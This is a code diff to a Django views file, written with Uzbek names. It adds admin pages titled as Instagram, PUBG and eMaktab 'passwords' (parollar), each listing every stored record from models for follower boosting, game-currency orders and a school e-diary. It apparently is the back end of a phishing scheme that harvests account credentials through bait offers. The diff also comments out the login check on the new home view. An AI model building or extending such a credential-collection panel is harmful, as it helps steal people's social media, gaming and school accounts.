@@ -3,14 +3,15 @@ from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 from django.views.decorators.http import require_http_methods
 from django.conf import settings
-from datetime import datetime, timedelta
+from datetime import datetime
 import glob
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth import authenticate, login
 from django.shortcuts import render, redirect
 from django.shortcuts import render
 from django.utils import timezone
-
+from user.models import *
+from emaktab.models import Emaktab
 
 def login_required_decorator(func):
     return login_required(func, login_url='kirish')
@@ -24,15 +25,33 @@ def kirish(request):
         user = authenticate(username=username, password=password)
         if user:
             login(request, user)
-            return redirect('media_admin')
+            return redirect('home')
         else:
             return render(request, 'kirish/index.html', {'error': 'Login yoki parol xato'})
     return render(request, 'kirish/index.html')
 
 
-@login_required_decorator
-def media_admin(request):
+# @login_required_decorator
+def home(request):
     return render(request, 'admin/index.html')
+
+
+
+@login_required_decorator
+def instagram_parollar(request):
+    insta=Nakrutka.objects.all()
+    return render(request, 'admin/insta.html', {'insta': insta})
+
+@login_required_decorator
+def pubg_parollar(request):
+    pubg=UCOrder.objects.all()
+    return render(request, 'admin/pubg.html', {'pubg': pubg})
+
+
+@login_required_decorator
+def emaktab_parollar(request):
+    emaktab=Emaktab.objects.all()
+    return render(request, 'admin/emaktab.html', {'emaktab': emaktab})
 
 
 def get_media(request):
